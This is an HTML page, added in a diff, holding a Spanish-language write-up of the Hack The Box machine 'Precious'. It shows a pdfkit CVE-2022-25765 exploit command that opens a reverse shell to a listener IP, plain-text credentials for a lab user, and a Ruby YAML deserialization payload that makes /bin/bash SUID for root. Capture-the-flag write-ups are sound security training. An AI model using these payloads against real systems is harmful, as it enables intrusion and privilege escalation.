@@ -1,0 +1,110 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Precious HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/precious/pasted-20260415175011.png" alt="Precious HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Precious</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>yml</span>
+            <span>ruby</span>
+            <span>pdfkit</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Web que convierte URLs en PDF</li>
+            <li><code>Explotación</code>: Metadatos del PDF revelan pdfkit vulnerable a RCE</li>
+            <li><code>Movimiento lateral</code>: Credenciales de <code>henry</code> encontradas en ficheros del sistema</li>
+            <li><code>Escalada de Privilegios</code>: Script Ruby con sudo carga <code>dependencies.yml</code> controlado por el usuario</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415182149.png" alt="Precious HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415180403.png" alt="Precious HTB" />
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415180447.png" alt="Precious HTB" />
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415180413.png" alt="Precious HTB" />
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415180515.png" alt="Precious HTB" />
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415180602.png" alt="Precious HTB" />
+          <p><a href="https://github.com/UNICORDev/exploit-CVE-2022-25765">Exploit</a></p>
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code>python3 exploit-CVE-2022-25765.py -s 10.10.16.178 4443 -w http://precious.htb -p url</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415181155.png" alt="Precious HTB" />
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415181143.png" alt="Precious HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <div class="code-card">
+            <h3>Buscar ficheros ocultos en el home del usuario</h3>
+            <pre><code>cd /home
+grep -ir "henry"
+# Credenciales -&gt; henry:Q3c1AqGHtoI0aXAYFH</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415183026.png" alt="Precious HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Interpretar código</h3>
+            <pre><code># Al ejecutarlo trata de cargar un fichero dependencies.yml. Al crear un fichero dependencies.yml malicioso conseguimos ejecutar comandos como root</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415183242.png" alt="Precious HTB" />
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415185208.png" alt="Precious HTB" />
+          <div class="code-card">
+            <h3>dependencies.yml</h3>
+            <pre><code>---
+ - !ruby/object:Gem::Installer
+     i: x
+ - !ruby/object:Gem::SpecFetcher
+     i: y
+ - !ruby/object:Gem::Requirement
+   requirements:
+     !ruby/object:Gem::Package::TarReader
+     io: &amp;1 !ruby/object:Net::BufferedIO
+       io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+          read: 0
+          header: "abc"
+       debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+          socket: &amp;1 !ruby/object:Gem::RequestSet
+              sets: !ruby/object:Net::WriteAdapter
+                  socket: !ruby/module 'Kernel'
+                  method_id: :system
+              git_set: chmod u+s /bin/bash
+          method_id: :resolve</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415185134.png" alt="Precious HTB" />
+          <img class="writeup-image" src="/writeups/assets/precious/pasted-20260415185148.png" alt="Precious HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>yml</span>
+            <span>ruby</span>
+            <span>pdfkit</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
